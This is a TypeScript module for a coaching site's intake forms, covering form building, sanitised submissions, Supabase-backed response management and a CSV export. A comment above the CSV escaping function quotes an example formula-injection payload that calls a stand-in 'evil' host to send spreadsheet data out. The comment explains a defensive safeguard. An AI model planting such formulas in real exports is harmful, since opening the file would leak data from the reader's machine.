/**
 * forms.ts — intake forms and their submissions.
 *
 * A form is a ROW now, not a hard-coded questionnaire: a coach builds their own,
 * an admin builds a general one, and the public /intake page renders whichever
 * applies. The answers land in `form_submissions`.
 *
 *   Demo mode  →  in-memory store seeded from DEMO_FORMS / DEMO_SUBMISSIONS
 *   Live mode  →  Supabase `intake_forms` + `form_submissions`
 *
 * Everything user-typed is sanitised and length-capped before it is written —
 * the builder labels, the form title, and every answer. Nothing here is the
 * security boundary: migration 024's RLS and the client_id stamp trigger are.
 * These functions hide controls that would fail and keep junk out of the table;
 * a caller who skips them still meets the same policies.
 *
 * Nothing throws. Every failure is a value, because every caller is a screen or
 * a public form that has to say something.
 *
 * 043 gave a submission a working life — a status, staff notes and an updated_at
 * — so the second half of this file is the response MANAGER: one list across
 * every form the reader may see, two column-scoped writes, and a pure CSV.
 *
 * Supabase migrations: supabase/migrations/024_forms.sql
 *                      supabase/migrations/040_submission_management.sql
 */

import { supabase, supabaseConfigured } from './supabase.ts'
import { sanitizeText, sanitizeShort, sanitizeEmail, isValidEmail, clampInt } from '../utils/sanitize.ts'
import type { WriteResult } from '../types/messaging.ts'

export type { WriteResult }

// ── Types ───────────────────────────────────────────────────────────────────

export type FieldType = 'text' | 'textarea' | 'number' | 'select' | 'checkbox' | 'date'

export const FIELD_TYPES: FieldType[] = ['text', 'textarea', 'number', 'select', 'checkbox', 'date']

function isFieldType(v: unknown): v is FieldType {
  return typeof v === 'string' && (FIELD_TYPES as string[]).includes(v)
}

export const FIELD_TYPE_LABELS: Record<FieldType, string> = {
  text: 'Short text',
  textarea: 'Long text',
  number: 'Number',
  select: 'Choose one',
  checkbox: 'Checkbox',
  date: 'Date',
}

/** One question on a form. `options` is only meaningful for `select`. */
export interface FormField {
  key: string
  label: string
  type: FieldType
  required: boolean
  options?: string[]
}

export interface IntakeForm {
  id: string
  /** null = the general, site-wide form. A slug = one coach's form. */
  coachSlug: string | null
  title: string
  description: string | null
  isActive: boolean
  fields: FormField[]
  createdBy: string | null
  createdAt: string
  updatedAt: string
}

/** Alias for the contract T2's manager imports against. Same row, one name. */
export type IntakeFormRow = IntakeForm

/**
 * Where a response is in the queue. Exactly the three 043's check constraint
 * accepts, so a value that passes through here cannot come back as a 23514.
 */
export type SubmissionStatus = 'new' | 'reviewed' | 'archived'

export const SUBMISSION_STATUSES: SubmissionStatus[] = ['new', 'reviewed', 'archived']

export function isSubmissionStatus(v: unknown): v is SubmissionStatus {
  return typeof v === 'string' && (SUBMISSION_STATUSES as string[]).includes(v)
}

export interface FormSubmission {
  id: string
  formId: string
  /** null = a guest submitted signed-out. */
  clientId: string | null
  clientEmail: string | null
  answers: Record<string, unknown>
  submittedAt: string
  /** 043. Staff-set; the submitter can read it and cannot change it. */
  status: SubmissionStatus
  /** 043. NOT private from the submitter — see the migration's essay. */
  staffNotes: string | null
  /** 043. Equal to submittedAt until a staff member works the response. */
  updatedAt: string
}

/**
 * A submission as the MANAGER sees it: raw columns, snake_case, the shape the
 * table has.
 *
 * Two shapes for one row is a real cost, so here is why it is worth paying.
 * `FormSubmission` is the per-form, per-athlete view the public flow and the
 * form builder have always used, and it is camelCase because nothing in those
 * screens is column-shaped. The manager is column-shaped end to end: it writes
 * to two named columns, filters on a third, and exports the lot to a CSV whose
 * headers ARE the columns. Renaming everything on the way in and back out again
 * would buy nothing but a place for the two spellings to drift.
 */
export interface SubmissionRow {
  id: string
  form_id: string
  /** null = a guest submitted signed-out. */
  client_id: string | null
  client_email: string | null
  answers: Record<string, unknown>
  status: SubmissionStatus
  staff_notes: string | null
  submitted_at: string
  updated_at: string
}

/** What a manager screen may change. Anything absent is left alone. */
export interface SubmissionPatch {
  status?: SubmissionStatus
  staffNotes?: string | null
}

/** Draft shape the builder saves. `id` present = update, absent = create. */
export interface FormDraft {
  id?: string
  coachSlug: string | null
  title: string
  description: string
  isActive: boolean
  fields: FormField[]
  /** Stamped on create; ignored on update. */
  createdBy?: string | null
}

export type SaveResult =
  | { ok: true; form: IntakeForm }
  | { ok: false; message: string }

export type SubmitResult =
  | { ok: true }
  | { ok: false; message: string }

const FORM_COLUMNS =
  'id,coach_slug,title,description,is_active,fields,created_by,created_at,updated_at'
const SUBMISSION_COLUMNS =
  'id,form_id,client_id,client_email,answers,submitted_at,status,staff_notes,updated_at'

/** The most rows a manager screen asks for in one go. */
const SUBMISSION_LIMIT = 1000

/** 043's own cap, mirrored so a long note is trimmed rather than 23514'd. */
const NOTES_MAX = 4000

/**
 * The one spelling of a stored staff note. Exported so the panel can show the
 * exact value the table now holds after a save, instead of echoing a draft the
 * sanitizer quietly shortened.
 */
export function cleanStaffNotes(raw: unknown): string | null {
  return sanitizeText(String(raw ?? ''), NOTES_MAX).trim() || null
}

// ── Field validation / normalisation ────────────────────────────────────────

const LABEL_MAX = 200
const OPTION_MAX = 120
const MAX_FIELDS = 100
const MAX_OPTIONS = 40
const ANSWER_MAX = 3000

/** A url/dom-safe key from a label, for a field the builder never named. */
function slugKey(label: string, index: number): string {
  const base = label
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '_')
    .replace(/^_+|_+$/g, '')
    .slice(0, 60)
  return base || `field_${index + 1}`
}

/**
 * Clean a builder's fields into what the database will accept: labels and
 * options sanitised and capped, an unknown type coerced to text, empty options
 * dropped, and keys made unique so two questions never overwrite one answer.
 */
export function normalizeFields(fields: FormField[]): FormField[] {
  const seen = new Set<string>()
  const out: FormField[] = []

  for (let i = 0; i < fields.length && out.length < MAX_FIELDS; i++) {
    const f = fields[i]
    const label = sanitizeText(String(f?.label ?? ''), LABEL_MAX).trim()
    if (!label) continue

    const type: FieldType = isFieldType(f?.type) ? f.type : 'text'

    let key = sanitizeShort(String(f?.key ?? '')).trim().toLowerCase().replace(/[^a-z0-9_]/g, '_')
    if (!key) key = slugKey(label, i)
    // Collisions would make two questions write the same answer slot.
    let unique = key
    let n = 2
    while (seen.has(unique)) unique = `${key}_${n++}`
    seen.add(unique)

    const field: FormField = { key: unique, label, type, required: !!f?.required }

    if (type === 'select') {
      const options = (Array.isArray(f?.options) ? f.options : [])
        .map(o => sanitizeText(String(o ?? ''), OPTION_MAX).trim())
        .filter(Boolean)
        .slice(0, MAX_OPTIONS)
      // A select with no options is an unanswerable question; keep the label but
      // let it fall back to a plain text box rather than storing a dead dropdown.
      if (options.length === 0) { field.type = 'text' }
      else field.options = options
    }

    out.push(field)
  }

  return out
}

/** The first thing wrong with a draft, or null if it is ready to save. */
export function draftProblem(draft: FormDraft): string | null {
  if (!draft.title.trim()) return 'Give the form a title.'
  const fields = normalizeFields(draft.fields)
  if (fields.length === 0) return 'Add at least one question.'
  return null
}

// ── Row mapping ─────────────────────────────────────────────────────────────

function asFields(raw: unknown): FormField[] {
  if (!Array.isArray(raw)) return []
  return normalizeFields(raw as FormField[])
}

function rowToForm(row: Record<string, unknown>): IntakeForm {
  return {
    id: String(row.id),
    coachSlug: (row.coach_slug as string | null) ?? null,
    title: String(row.title ?? ''),
    description: (row.description as string | null) ?? null,
    isActive: !!row.is_active,
    fields: asFields(row.fields),
    createdBy: (row.created_by as string | null) ?? null,
    createdAt: String(row.created_at ?? ''),
    updatedAt: String(row.updated_at ?? row.created_at ?? ''),
  }
}

function asAnswers(raw: unknown): Record<string, unknown> {
  return (raw && typeof raw === 'object' && !Array.isArray(raw))
    ? raw as Record<string, unknown>
    : {}
}

/**
 * A status the screen can switch on. Anything unrecognised reads as 'new' rather
 * than as itself: 043's check constraint means an off-list value cannot be in
 * the column, so the only way to get here is a row written before that migration
 * landed, and "nobody has worked this yet" is the right thing to say about one.
 */
function asStatus(raw: unknown): SubmissionStatus {
  return isSubmissionStatus(raw) ? raw : 'new'
}

function rowToSubmission(row: Record<string, unknown>): FormSubmission {
  const submittedAt = String(row.submitted_at ?? '')
  return {
    id: String(row.id),
    formId: String(row.form_id),
    clientId: (row.client_id as string | null) ?? null,
    clientEmail: (row.client_email as string | null) ?? null,
    answers: asAnswers(row.answers),
    submittedAt,
    status: asStatus(row.status),
    staffNotes: (row.staff_notes as string | null) ?? null,
    updatedAt: String(row.updated_at ?? submittedAt),
  }
}

function rowToSubmissionRow(row: Record<string, unknown>): SubmissionRow {
  const submitted_at = String(row.submitted_at ?? '')
  return {
    id: String(row.id),
    form_id: String(row.form_id),
    client_id: (row.client_id as string | null) ?? null,
    client_email: (row.client_email as string | null) ?? null,
    answers: asAnswers(row.answers),
    status: asStatus(row.status),
    staff_notes: (row.staff_notes as string | null) ?? null,
    submitted_at,
    updated_at: String(row.updated_at ?? submitted_at),
  }
}

/** The demo store keeps one shape; the manager asks for the other. */
function toSubmissionRow(s: FormSubmission): SubmissionRow {
  return {
    id: s.id,
    form_id: s.formId,
    client_id: s.clientId,
    client_email: s.clientEmail,
    answers: { ...s.answers },
    status: s.status,
    staff_notes: s.staffNotes,
    submitted_at: s.submittedAt,
    updated_at: s.updatedAt,
  }
}

// ── In-memory demo store ─────────────────────────────────────────────────────

const DEMO_FORMS: IntakeForm[] = [
  {
    id: 'demo-form-general',
    coachSlug: null,
    title: 'General Intake',
    description: 'Tell us about yourself and your training. This helps us point you to the right coach and start your program on the right footing.',
    isActive: true,
    fields: [
      { key: 'full_name', label: 'Full name', type: 'text', required: true },
      { key: 'email', label: 'Email address', type: 'text', required: true },
      { key: 'phone', label: 'Phone number', type: 'text', required: false },
      { key: 'goals', label: 'What are your main training goals?', type: 'textarea', required: true },
      { key: 'experience', label: 'How long have you been training seriously?', type: 'select', required: true, options: ['Less than 1 year', '1 to 2 years', '2 to 4 years', '4 or more years'] },
      { key: 'injuries', label: 'Any past or current injuries or medical conditions we should know about?', type: 'textarea', required: false },
      { key: 'training_days', label: 'How many days a week can you train?', type: 'number', required: true },
      { key: 'consent', label: 'I understand Axis Training Systems will use this information to provide coaching.', type: 'checkbox', required: true },
    ],
    createdBy: null,
    createdAt: '2026-07-01T12:00:00.000Z',
    updatedAt: '2026-07-01T12:00:00.000Z',
  },
  {
    id: 'demo-form-ronnie',
    coachSlug: 'ronnie-vallejo',
    title: 'Ronnie — Powerlifting Intake',
    description: 'A few extra questions before we build your first block together.',
    isActive: true,
    fields: [
      { key: 'full_name', label: 'Full name', type: 'text', required: true },
      { key: 'email', label: 'Email address', type: 'text', required: true },
      { key: 'best_total', label: 'Best competition or gym total (lbs)', type: 'number', required: false },
      { key: 'next_meet', label: 'Do you have a meet coming up? When?', type: 'text', required: false },
      { key: 'weak_point', label: 'Which lift needs the most work?', type: 'select', required: true, options: ['Squat', 'Bench', 'Deadlift', 'All three'] },
    ],
    createdBy: 'demo-ronnie',
    createdAt: '2026-07-15T12:00:00.000Z',
    updatedAt: '2026-07-15T12:00:00.000Z',
  },
]

/**
 * `daysAgo` days before now, at a fixed hour.
 *
 * The forms above carry fixed dates because "this form was built a while back"
 * ages gracefully. Submissions cannot: the manager counts what arrived this week
 * and filters on a date range, and a demo where every response is four months
 * old shows a zero and an empty list. Same idiom userManagement's demo people
 * use, for the same reason.
 */
function demoIso(daysAgo: number, hour = 15): string {
  const d = new Date()
  d.setUTCDate(d.getUTCDate() - daysAgo)
  d.setUTCHours(hour, 0, 0, 0)
  return d.toISOString()
}

/**
 * Six responses across the two demo forms, deliberately mixed: guests and
 * signed-in members, all three statuses, some annotated and some not, spread
 * from yesterday to five weeks back. Every filter, stat and empty state on the
 * manager has something to bite on without a database.
 */
const DEMO_SUBMISSIONS: FormSubmission[] = [
  {
    id: 'demo-sub-1',
    formId: 'demo-form-general',
    clientId: null,
    clientEmail: 'jordan@example.com',
    answers: {
      full_name: 'Jordan Reyes',
      email: 'jordan@example.com',
      phone: '(559) 555-0142',
      goals: 'Compete in my first powerlifting meet within a year and hit a 1000 lb total.',
      experience: '1 to 2 years',
      injuries: 'Mild lower back tightness, nothing diagnosed.',
      training_days: 4,
      consent: true,
    },
    submittedAt: demoIso(1, 17),
    status: 'new',
    staffNotes: null,
    updatedAt: demoIso(1, 17),
  },
  {
    id: 'demo-sub-2',
    formId: 'demo-form-ronnie',
    clientId: null,
    clientEmail: 'sam@example.com',
    answers: {
      full_name: 'Sam Whitfield',
      email: 'sam@example.com',
      best_total: 1185,
      next_meet: 'USAPL state in November',
      weak_point: 'Bench',
    },
    submittedAt: demoIso(3),
    status: 'new',
    staffNotes: null,
    updatedAt: demoIso(3),
  },
  {
    id: 'demo-sub-3',
    formId: 'demo-form-general',
    clientId: 'demo-devin',
    clientEmail: 'devin.cross@gmail.com',
    answers: {
      full_name: 'Devin Cross',
      email: 'devin.cross@gmail.com',
      phone: '(559) 555-0177',
      goals: 'Come back from a long layoff without wrecking my shoulder again.',
      experience: '4 or more years',
      injuries: 'Right shoulder impingement, cleared by physio in June.',
      training_days: 3,
      consent: true,
    },
    submittedAt: demoIso(6, 9),
    status: 'reviewed',
    staffNotes: 'Called Devin. Starting him with Seth on a three day upper/lower, no overhead pressing for four weeks.',
    updatedAt: demoIso(5, 11),
  },
  {
    id: 'demo-sub-4',
    formId: 'demo-form-general',
    clientId: 'demo-marcus',
    clientEmail: 'marcus.r@gmail.com',
    answers: {
      full_name: 'Marcus Rivera',
      email: 'marcus.r@gmail.com',
      goals: 'Put on size. I have never followed a real program.',
      experience: 'Less than 1 year',
      training_days: 5,
      consent: true,
    },
    submittedAt: demoIso(11, 20),
    status: 'new',
    staffNotes: null,
    updatedAt: demoIso(11, 20),
  },
  {
    id: 'demo-sub-5',
    formId: 'demo-form-ronnie',
    clientId: 'demo-bianca',
    clientEmail: 'bianca.reyes@gmail.com',
    answers: {
      full_name: 'Bianca Reyes',
      email: 'bianca.reyes@gmail.com',
      best_total: 905,
      next_meet: 'Nothing booked yet',
      weak_point: 'Squat',
    },
    submittedAt: demoIso(24, 13),
    status: 'archived',
    staffNotes: 'Moved to Lucas after the first call. Filed here so the handover is on the record.',
    updatedAt: demoIso(22, 8),
  },
  {
    id: 'demo-sub-6',
    formId: 'demo-form-general',
    clientId: null,
    clientEmail: 'priya.nair@example.com',
    answers: {
      full_name: 'Priya Nair',
      email: 'priya.nair@example.com',
      phone: '(559) 555-0165',
      goals: 'General strength, two mornings a week, nothing competitive.',
      experience: '2 to 4 years',
      injuries: '',
      training_days: 2,
      consent: true,
    },
    submittedAt: demoIso(35, 7),
    status: 'reviewed',
    staffNotes: 'Sent the two-day template and the schedule. No reply yet.',
    updatedAt: demoIso(33, 16),
  },
]

let _demoForms: IntakeForm[] | null = null
let _demoSubs: FormSubmission[] | null = null

function demoForms(): IntakeForm[] {
  if (!_demoForms) _demoForms = DEMO_FORMS.map(f => ({ ...f, fields: f.fields.map(x => ({ ...x })) }))
  return _demoForms
}
function demoSubs(): FormSubmission[] {
  if (!_demoSubs) _demoSubs = DEMO_SUBMISSIONS.map(s => ({ ...s, answers: { ...s.answers } }))
  return _demoSubs
}

// ── Reads ────────────────────────────────────────────────────────────────────

/**
 * The forms the current staff member may manage. RLS decides the rows: an admin
 * (or manage_forms holder) gets every form; a coach gets their own plus the
 * active general one. Null is an outage — kept distinct from "no forms" so a
 * failed read never reads as an empty roster.
 */
export async function fetchForms(isDemo: boolean): Promise<IntakeForm[] | null> {
  if (!supabaseConfigured || isDemo) {
    return demoForms().map(f => ({ ...f, fields: f.fields.map(x => ({ ...x })) }))
  }

  const { data, error } = await supabase
    .from('intake_forms')
    .select(FORM_COLUMNS)
    // General form first, then newest.
    .order('coach_slug', { ascending: true, nullsFirst: true })
    .order('created_at', { ascending: false })

  if (error) return null
  return (data ?? []).map(r => rowToForm(r as Record<string, unknown>))
}

/**
 * The single active form to render for a scope — a coach's slug, or null for the
 * general one. Null result = none published (or an outage). The public /intake
 * page and the post-booking step both start here.
 */
export async function fetchActiveForm(coachSlug: string | null, isDemo: boolean): Promise<IntakeForm | null> {
  if (!supabaseConfigured || isDemo) {
    const match = demoForms()
      .filter(f => f.isActive && f.coachSlug === coachSlug)
      .sort((a, b) => b.createdAt.localeCompare(a.createdAt))[0]
    return match ? { ...match, fields: match.fields.map(x => ({ ...x })) } : null
  }

  let q = supabase
    .from('intake_forms')
    .select(FORM_COLUMNS)
    .eq('is_active', true)
    .order('created_at', { ascending: false })
    .limit(1)

  q = coachSlug === null ? q.is('coach_slug', null) : q.eq('coach_slug', coachSlug)

  const { data, error } = await q.maybeSingle()
  if (error || !data) return null
  return rowToForm(data as Record<string, unknown>)
}

/**
 * The submissions to one form, newest first. Null = outage. RLS confines this to
 * the admin, a view_form_submissions holder, or the coach who owns the form.
 */
export async function fetchSubmissions(formId: string, isDemo: boolean): Promise<FormSubmission[] | null> {
  if (!supabaseConfigured || isDemo) {
    return demoSubs()
      .filter(s => s.formId === formId)
      .sort((a, b) => b.submittedAt.localeCompare(a.submittedAt))
      .map(s => ({ ...s, answers: { ...s.answers } }))
  }

  const { data, error } = await supabase
    .from('form_submissions')
    .select(SUBMISSION_COLUMNS)
    .eq('form_id', formId)
    .order('submitted_at', { ascending: false })

  if (error) return null
  return (data ?? []).map(r => rowToSubmission(r as Record<string, unknown>))
}

/**
 * Every submission the reader may see, across every form, newest first.
 *
 * The manager's one read. There is no form filter and no status filter in the
 * query on purpose: the screen holds a thousand rows at most, filters them in
 * the browser, and exports whatever is on screen — a round trip per pill press
 * would be slower and would make the CSV disagree with the list.
 *
 * WHICH rows come back is not this function's business. 024's read policy
 * decides it: an admin and a `view_form_submissions` holder see everything, a
 * coach sees responses to their own form, and an athlete would see only their
 * own — which is why the manager is behind a staff route rather than why this
 * query is shaped the way it is.
 *
 * Null is an outage, kept distinct from an empty list so a failed read never
 * renders as "no responses yet".
 */
export async function fetchAllSubmissions(isDemo = false): Promise<SubmissionRow[] | null> {
  if (!supabaseConfigured || isDemo) {
    return demoSubs()
      .slice()
      .sort((a, b) => b.submittedAt.localeCompare(a.submittedAt))
      .slice(0, SUBMISSION_LIMIT)
      .map(toSubmissionRow)
  }

  const { data, error } = await supabase
    .from('form_submissions')
    .select(SUBMISSION_COLUMNS)
    .order('submitted_at', { ascending: false })
    .limit(SUBMISSION_LIMIT)

  if (error) return null
  return (data ?? []).map(r => rowToSubmissionRow(r as Record<string, unknown>))
}

// ── Writes ───────────────────────────────────────────────────────────────────

/**
 * Create or update a form. `draft.id` present updates in place; absent creates.
 *
 * Fields are normalised before the write, so the row that lands is always clean.
 * The database may still refuse — a coach who is not the owner, or a change to
 * the questions of a form athletes have already answered — and that refusal is
 * returned as a sentence rather than thrown.
 */
export async function saveForm(draft: FormDraft, isDemo: boolean): Promise<SaveResult> {
  const problem = draftProblem(draft)
  if (problem) return { ok: false, message: problem }

  const title = sanitizeText(draft.title, 200).trim()
  const description = sanitizeText(draft.description ?? '', 2000).trim()
  const fields = normalizeFields(draft.fields)
  const coachSlug = draft.coachSlug
    ? sanitizeShort(draft.coachSlug).trim().toLowerCase()
    : null

  if (!supabaseConfigured || isDemo) {
    const store = demoForms()
    const now = new Date().toISOString()
    if (draft.id) {
      const idx = store.findIndex(f => f.id === draft.id)
      if (idx === -1) return { ok: false, message: 'That form no longer exists.' }
      // Mirror the answered-form guard so the demo behaves like production.
      const answered = demoSubs().some(s => s.formId === draft.id)
      const fieldsChanged = JSON.stringify(store[idx].fields) !== JSON.stringify(fields)
      if (answered && fieldsChanged) {
        return { ok: false, message: 'Athletes have already answered this form. Switch it off and build a new one rather than changing the questions.' }
      }
      const updated: IntakeForm = { ...store[idx], title, description, isActive: draft.isActive, fields, coachSlug, updatedAt: now }
      store[idx] = updated
      return { ok: true, form: { ...updated, fields: updated.fields.map(x => ({ ...x })) } }
    }
    const created: IntakeForm = {
      id: `demo-form-${Math.random().toString(36).slice(2, 10)}`,
      coachSlug, title, description, isActive: draft.isActive, fields,
      createdBy: draft.createdBy ?? null, createdAt: now, updatedAt: now,
    }
    store.unshift(created)
    return { ok: true, form: { ...created, fields: created.fields.map(x => ({ ...x })) } }
  }

  if (draft.id) {
    const { data, error } = await supabase
      .from('intake_forms')
      .update({ title, description: description || null, is_active: draft.isActive, coach_slug: coachSlug, fields })
      .eq('id', draft.id)
      .select(FORM_COLUMNS)
      .single()
    if (error) return { ok: false, message: saveError(error.message) }
    return { ok: true, form: rowToForm(data as Record<string, unknown>) }
  }

  const { data, error } = await supabase
    .from('intake_forms')
    .insert({ title, description: description || null, is_active: draft.isActive, coach_slug: coachSlug, fields, created_by: draft.createdBy ?? null })
    .select(FORM_COLUMNS)
    .single()
  if (error) return { ok: false, message: saveError(error.message) }
  return { ok: true, form: rowToForm(data as Record<string, unknown>) }
}

/** The most common refusals, turned into something a coach can act on. */
function saveError(raw: string): string {
  if (/row-level security|violates row-level/i.test(raw)) {
    return 'You can only edit your own form or the general one you have been given access to.'
  }
  if (/already answered|filled this form/i.test(raw)) return raw
  return 'Could not save the form. Please try again.'
}

/**
 * Submit a filled-in form. Public — the caller may be a guest. Answers are
 * sanitised and capped by field type; the email is validated. The database
 * stamps client_id from the session, so a signed-in submitter's answers become
 * readable to them and a guest's stay guest.
 */
export async function submitForm(
  formId: string,
  form: IntakeForm,
  rawAnswers: Record<string, unknown>,
  rawEmail: string,
  isDemo: boolean,
): Promise<SubmitResult> {
  const email = sanitizeEmail(String(rawEmail ?? ''))
  const answers = cleanAnswers(form.fields, rawAnswers)

  // Required-field check, mirroring what the DB does NOT enforce (a jsonb blob
  // has no per-key NOT NULL). The public component checks too; this is the seam
  // every caller passes through.
  for (const f of form.fields) {
    if (!f.required) continue
    const v = answers[f.key]
    const missing = f.type === 'checkbox' ? v !== true : (v === undefined || v === null || String(v).trim() === '')
    if (missing) return { ok: false, message: `Please answer: ${f.label}` }
  }

  // An email field, if the form has one, must be a real address.
  if (email && !isValidEmail(email)) return { ok: false, message: 'Enter a valid email address.' }

  if (!supabaseConfigured || isDemo) {
    const now = new Date().toISOString()
    demoSubs().unshift({
      id: `demo-sub-${Math.random().toString(36).slice(2, 10)}`,
      formId, clientId: null, clientEmail: email || null, answers,
      submittedAt: now,
      // What 043's defaults would have made it: brand new, unworked, and
      // updated_at equal to submitted_at until somebody touches it.
      status: 'new', staffNotes: null, updatedAt: now,
    })
    return { ok: true }
  }

  const { error } = await supabase
    .from('form_submissions')
    .insert({ form_id: formId, client_email: email || null, answers })
  if (error) {
    if (/row-level security|violates row-level/i.test(error.message)) {
      return { ok: false, message: 'This form is no longer accepting responses.' }
    }
    return { ok: false, message: 'Could not send your response. Please try again.' }
  }
  return { ok: true }
}

/** Sanitise each answer by its field's type, dropping anything off-form. */
function cleanAnswers(fields: FormField[], raw: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = {}
  for (const f of fields) {
    const v = raw[f.key]
    if (v === undefined || v === null) continue
    switch (f.type) {
      case 'checkbox':
        out[f.key] = v === true || v === 'true'
        break
      case 'number': {
        const s = String(v).trim()
        if (s === '') break
        out[f.key] = clampInt(s, -1_000_000, 1_000_000, 0)
        break
      }
      case 'select': {
        const s = sanitizeText(String(v), OPTION_MAX).trim()
        // Only accept a value that is actually one of the offered options.
        if (f.options && f.options.includes(s)) out[f.key] = s
        break
      }
      case 'date': {
        const s = sanitizeShort(String(v)).trim()
        if (/^\d{4}-\d{2}-\d{2}$/.test(s)) out[f.key] = s
        break
      }
      default: {
        const s = sanitizeText(String(v), ANSWER_MAX).trim()
        if (s) out[f.key] = s
      }
    }
  }
  return out
}

// ── Working a response (043) ─────────────────────────────────────────────────

/**
 * The two refusals a manager screen can actually hit, as sentences.
 *
 * Both arrive as ZERO ROWS rather than as errors, because that is what an RLS
 * policy that does not match looks like from PostgREST. Every write below asks
 * for `.select('id')` back for exactly that reason — a screen that reads an
 * empty result as success shows a status the database never agreed to.
 */
const UPDATE_REFUSED =
  'That response was not updated. It may have been deleted, or working responses '
  + 'to that form may need an admin, the See form submissions permission, or the '
  + 'coach who owns it.'

// Deleting needs the delete tier AND the ability to read the row: 043's policy
// names admin-or-manage_forms, and Postgres applies the read policy too because
// this call carries a RETURNING clause. The sentence names both halves so the
// person reading it knows what to ask for.
const DELETE_REFUSED =
  'That response was not deleted. It may already be gone, or deleting one may need '
  + 'an admin, or both the Manage intake forms and See form submissions permissions.'

/** A PostgREST error on one of these writes, turned into something actionable. */
function submissionError(error: { message?: string; code?: string } | null, fallback: string): string {
  if (!error) return fallback
  const code = error.code ?? ''
  const msg = (error.message ?? '').replace(/^ERROR:\s*/i, '').trim()

  if ((code === 'P0001' || code === '22023') && msg) return msg
  if (code === '23514') return 'That does not fit. A note caps at 4000 characters.'
  if (code === '42501' || /row-level security|permission denied/i.test(msg)) {
    return 'The database refused that change. Your account may not have permission any more. Sign out, sign back in, and try again.'
  }
  if (code === 'PGRST301' || /jwt|token is expired/i.test(msg)) {
    return 'Your session expired. Sign in again and the change will go through.'
  }
  if (/failed to fetch|networkerror|load failed/i.test(msg)) {
    return 'Could not reach the server. Check your connection. Nothing was changed.'
  }
  return fallback
}

/**
 * Move a response through the queue, and write down what was decided.
 *
 * Two columns and only two, because that is the entire update grant 043 hands
 * out: `status` and `staff_notes`. Everything that makes a submission evidence —
 * the answers, the email, who filed it, when — is outside the grant, so this
 * function has nothing to defend and no way to overreach.
 *
 * An absent key is left alone; `staffNotes: null` clears the note. A patch with
 * neither key is a no-op and says so by succeeding, rather than by sending
 * PostgREST an empty body it would reject.
 *
 * A CLIENT CANNOT REACH THIS, and that is the point of 043. They may read their
 * own submission back and the update policy still does not include them, so the
 * write matches nothing and comes home as the refusal sentence above.
 */
export async function updateSubmission(
  id: string,
  patch: SubmissionPatch,
  isDemo = false,
): Promise<WriteResult> {
  const wantsStatus = patch.status !== undefined
  const wantsNotes = patch.staffNotes !== undefined

  if (wantsStatus && !isSubmissionStatus(patch.status)) {
    return { ok: false, message: 'A response can only be new, reviewed or archived.' }
  }

  const notes = wantsNotes ? cleanStaffNotes(patch.staffNotes) : undefined

  if (!wantsStatus && !wantsNotes) return { ok: true }

  if (!supabaseConfigured || isDemo) {
    const row = demoSubs().find(s => s.id === id)
    if (!row) return { ok: false, message: UPDATE_REFUSED }
    if (wantsStatus) row.status = patch.status as SubmissionStatus
    if (wantsNotes) row.staffNotes = notes ?? null
    row.updatedAt = new Date().toISOString()
    return { ok: true }
  }

  const changes: Record<string, unknown> = {}
  if (wantsStatus) changes.status = patch.status
  if (wantsNotes) changes.staff_notes = notes

  const { data, error } = await supabase
    .from('form_submissions')
    .update(changes)
    .eq('id', id)
    .select('id')

  if (error) return { ok: false, message: submissionError(error, 'That response was not updated.') }
  if (!data || data.length === 0) return { ok: false, message: UPDATE_REFUSED }
  return { ok: true }
}

/**
 * Destroy a response.
 *
 * The narrowest thing in this file, and 043 keeps it that way: the admin or a
 * `manage_forms` holder, where working the queue is open to the owning coach and
 * to anyone with `view_form_submissions`. Archiving is how a response gets out
 * of the way; this is for the test submissions and the junk.
 *
 * It does not touch the form. 024 still blocks deleting a form anyone has
 * answered, and still freezes its questions.
 */
export async function deleteSubmission(id: string, isDemo = false): Promise<WriteResult> {
  if (!supabaseConfigured || isDemo) {
    const store = demoSubs()
    const index = store.findIndex(s => s.id === id)
    if (index === -1) return { ok: false, message: 'That response is already gone. Refresh the list.' }
    store.splice(index, 1)
    return { ok: true }
  }

  const { data, error } = await supabase
    .from('form_submissions')
    .delete()
    .eq('id', id)
    .select('id')

  if (error) return { ok: false, message: submissionError(error, 'That response was not deleted.') }
  if (!data || data.length === 0) return { ok: false, message: DELETE_REFUSED }
  return { ok: true }
}

// ── Export ───────────────────────────────────────────────────────────────────

/**
 * One CSV cell, escaped for both the file format and the thing that opens it.
 *
 * A copy of newsletterApi's `csvCell`, which is module-private there and is not
 * this file's to export from. Both problems it solves are worth restating: a
 * value containing a double quote ends its own field and shifts every column
 * after it, and CSV escapes a quote by doubling it; and a value STARTING with
 * `=`, `+`, `-` or `@` is a FORMULA to Excel and Sheets, so an athlete who
 * types `=HYPERLINK("http://evil/"&A1,"click")` into a free-text answer gets
 * that executed on a coach's machine when they open the export. The leading
 * apostrophe makes the spreadsheet treat it as the text it always was.
 *
 * Answers reach this via JSON.stringify, so the value can contain quotes,
 * commas and newlines. All three are legal inside a quoted field.
 */
function csvCell(value: string): string {
  const raw = String(value ?? '')
  const escaped = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
  return `"${escaped.replace(/"/g, '""')}"`
}

/**
 * The filtered response list as a CSV, as a string.
 *
 * PURE, deliberately: it takes rows and forms and returns text, touching no
 * Blob, no document and no clock. The screen decides WHICH rows (whatever the
 * filters left on screen) and what to do with the text; this decides what a
 * response looks like as a line. That is also what makes the escaping above
 * testable, which is the half of a CSV export that can actually hurt somebody.
 *
 * Six columns. `submitted_at` goes out as the stored ISO timestamp rather than a
 * formatted date: a spreadsheet sorts it correctly, it does not depend on the
 * exporter's locale, and no information is thrown away. The answers ride in one
 * JSON column because the forms in a cross-form export do not share questions —
 * a column per key would be a sparse matrix a hundred wide.
 */
export function submissionsToCsv(rows: SubmissionRow[], forms: IntakeFormRow[]): string {
  const titles = new Map<string, string>()
  for (const f of forms ?? []) titles.set(f.id, f.title)

  const header = ['Submitted', 'Form', 'Email', 'Submitter', 'Status', 'Answers']
    .map(csvCell)
    .join(',')

  const lines = (rows ?? []).map(r => [
    csvCell(r.submitted_at),
    // A form the reader cannot see is not a deleted form: 024 cascades a form's
    // submissions away with it, so an id with no title here means the form was
    // outside the fetch, not that it is gone.
    csvCell(titles.get(r.form_id) ?? 'Unknown form'),
    csvCell(r.client_email ?? ''),
    csvCell(r.client_id ? 'Member' : 'Guest'),
    csvCell(r.status),
    csvCell(JSON.stringify(r.answers ?? {})),
  ].join(','))

  return [header, ...lines].join('\n')
}

/** For the demo/reset seam and tests. */
export function _resetFormsDemoStore() {
  _demoForms = null
  _demoSubs = null
}
